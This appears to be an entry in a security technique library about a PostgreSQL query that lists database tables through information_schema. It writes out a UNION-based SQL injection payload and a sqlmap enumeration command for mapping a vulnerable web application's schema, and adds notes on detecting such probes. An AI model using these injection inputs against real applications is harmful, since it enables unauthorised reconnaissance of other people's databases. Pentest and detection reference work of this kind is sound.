---
id: fa4cb255-320e-4c4b-8d94-2f393921f4fc
name: PostgreSQL-List-Tables-Query
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.690416+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - PostgreSQL
tags:
  - sql-injection
  - database-discovery
validated: true
---

# PostgreSQL-List-Tables-Query

## Code

```sql
SELECT table_name FROM information_schema.tables
```

## Description

This SQL code snippet queries the information_schema.tables view to list all table names in the current PostgreSQL database. It is a key payload for SQL injection attacks aimed at database schema enumeration, allowing attackers to identify potential targets for data extraction without direct access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Static query; no variables. Targets the default schema for the connected database user. | N/A |

## Usage

Inject this query via UNION in a vulnerable web application parameter, e.g., ?id=1' UNION SELECT table_name FROM information_schema.tables --. Use tools like sqlmap for automation: sqlmap -u "http://target.com/search?q=1" --dbms=postgresql --tables. This is typically part of reconnaissance in web pentests to map database structure before deeper exploitation.

## Detection

- Monitor application logs for anomalous SELECT queries on information_schema.
- WAF rules to block UNION-based payloads or keywords like "information_schema".
- Database audit logs showing unexpected metadata queries from application IPs.
- Error messages in responses indicating SQL syntax issues from injections.

## Related

- [[procedures/PostgreSQL-List-Tables-via-SQL-Injection]]
- [[techniques/Exploitation of Remote Services|T1210]]
